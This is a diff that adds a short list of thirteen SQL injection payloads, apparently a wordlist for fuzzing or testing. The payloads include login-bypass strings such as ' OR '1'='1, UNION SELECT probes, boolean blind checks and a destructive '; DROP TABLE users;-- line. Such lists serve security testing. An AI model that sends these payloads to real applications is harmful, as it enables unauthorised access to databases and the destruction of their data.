@@ -1,0 +1,13 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+admin'--
+' OR 'x'='x
+'; DROP TABLE users;--
+' UNION SELECT 1,2,3--
+1' AND 1=1--
+1' AND 1=2--
+' OR 1=1#
+") OR ("1"="1
+' OR ''='
+1;SELECT * FROM users--
